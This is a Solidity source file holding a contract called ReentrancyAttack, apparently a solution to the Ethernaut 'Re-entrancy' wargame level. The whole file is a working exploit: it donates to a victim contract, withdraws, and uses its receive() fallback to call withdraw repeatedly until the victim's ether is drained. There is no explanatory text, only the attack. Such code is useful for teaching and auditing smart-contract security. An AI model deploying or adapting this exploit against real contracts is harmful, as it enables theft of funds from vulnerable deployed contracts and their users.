// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "./Re-entrancy.sol";

contract ReentrancyAttack {
    Reentrance public victim;

    constructor(address payable reentrance) public {
        victim = Reentrance(reentrance);
    }

    function fund() public payable {
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(victim).balance;
        if (targetBalance >= 0.001 ether) {
            victim.withdraw(0.001 ether);
        }
    }
}
